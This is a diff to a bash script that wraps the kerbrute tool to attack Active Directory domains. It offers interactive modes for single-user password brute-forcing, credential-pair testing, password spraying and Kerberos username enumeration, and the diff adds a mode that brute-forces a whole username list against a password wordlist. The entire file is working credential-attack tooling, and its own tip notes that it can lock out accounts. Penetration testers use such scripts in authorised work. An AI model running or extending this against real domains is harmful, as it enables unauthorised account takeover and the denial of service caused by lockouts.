@@ -1,9 +1,10 @@
 #!/bin/bash
 
 line="\n============================================================\n"
-cred="'"
 
-echo -e "$line\nSelect the operation to perform:\n[1] bruteuser - Bruteforce a single user's password from a wordlist\n[2] bruteforce - Read username:password combos from a file\n[3] passwordspray - Test a single password against a list of users\n[4] userenum - Enumerate valid domain usernames via Kerberos\n\n[!] Tip: Kerbrute can lockout accounts if that setting is enabled\n"
+echo -e "$line\nSelect the operation to perform:\n[1] bruteuser - Bruteforce a single user's password from a wordlist"
+echo -e "[2] credpairs - Read username:password combos from a file\n[3] passwordspray - Test a single password against a list of users"
+echo -e "[4] userenum - Enumerate valid domain usernames via Kerberos\n[5] bruteforce - Bruteforce usenames & passwords\n\n[!] Tip: Kerbrute can lockout accounts if that setting is enabled\n"
 read mode
 
 echo -e "\nSpecify the domain (e.g. xample.local):\n"
@@ -17,7 +18,8 @@ then
 	echo -e "\nEnter the file path for the password wordlist:\n"
 	read passwd
 	echo -e "\nEnter the username to Bruteforce\n"
-	read user
+	read username
+	user="'"; user+=$username; user+="'"
 
 	set -x
 	kerbrute bruteuser -d $dom --dc $dc $passwd $user
@@ -36,7 +38,7 @@ elif [ $mode == 3 ]
 then
 	echo -e "\nSpecify the password to spray:\n"
 	read passwd
-	cred+="$passwd"; cred+="'"
+	cred="'"; cred+="$passwd"; cred+="'"
 	echo -e "\nSpecify the file path to the username wordlist:\n"
 	read user
 
@@ -52,6 +54,23 @@ then
 	set -x
 	kerbrute userenum -d $dom --dc $dc $user
 	set +x
+
+elif [ $mode == 5 ]
+then
+	echo -e "\nSpecify the file path to the username wordlist:\n"
+	read user_list
+	echo -e "\nEnter the file path for the password wordlist:\n"
+	read passwd
+
+	for u in $(cat $user_list)
+	do
+		user="'"; user+=$u; user+="'"
+
+		set -x
+		kerbrute bruteuser -d $dom --dc $dc $passwd $user
+		set +x
+		echo -e "$line"
+	done
 
 else
 	echo -e "\nYou did not select a valid option\n"
